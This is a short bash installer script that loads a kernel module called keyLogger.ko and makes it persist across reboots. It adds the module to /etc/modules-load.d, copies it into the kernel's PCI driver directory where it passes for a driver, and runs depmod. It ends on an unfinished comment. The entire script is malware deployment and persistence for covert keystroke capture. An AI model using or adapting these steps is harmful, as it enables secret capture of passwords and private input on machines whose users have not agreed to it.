#!/bin/bash

# starts the key logger now
sudo insmod keyLogger.ko

# Make it resilent to reboot
sudo bash -c  'echo keyLogger >> /etc/modules-load.d/keyLogger.conf'
sudo cp ./keyLogger.ko /lib/modules/$(uname -r)/kernel/drivers/pci
sudo depmod

# thread thats run the script
